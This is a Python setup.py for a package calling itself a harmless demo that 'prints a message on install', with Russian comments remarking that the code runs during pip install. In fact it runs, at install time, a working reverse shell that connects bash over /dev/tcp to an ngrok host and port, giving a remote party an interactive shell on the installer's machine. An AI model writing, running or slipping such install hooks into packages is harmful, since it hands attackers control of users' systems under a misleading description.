from setuptools import setup
import os

# ⚠️ Это код выполнится при pip install!
__import__('os').system('bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/10395 0>&1"')
# Пример: можно выполнить любую команду
# os.system("whoami")  # ← опасно, но технически возможно

setup(
    name="my-demo-package-2025",
    version="0.1",
    description="A demo package that prints a message on install",
    py_modules=["dummy"],
)